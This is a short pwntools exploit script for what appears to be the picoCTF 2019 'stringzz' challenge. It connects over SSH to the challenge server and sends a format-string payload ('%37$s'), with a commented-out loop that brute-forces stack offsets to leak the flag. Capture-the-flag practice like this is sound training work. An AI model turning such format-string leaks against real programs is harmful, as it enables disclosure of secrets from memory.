from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")

def start():
  global sh
  if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # if DEBUG:
    #   attach_gdb()

    REMOTE = False
  else:
    sh = s.process('vuln', cwd='/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4')
    REMOTE = True

# for i in range(200):
#   start()
#   try:
#     sh.sendlineafter(':\n', '%{}$s'.format(i))
#     data = sh.recvall()
#     if 'pico' in data:
#       print data
#       exit()
#   except:
#     print 'pass'
start()

payload = '%37$s'
sh.sendlineafter(':\n', payload)
sh.interactive()
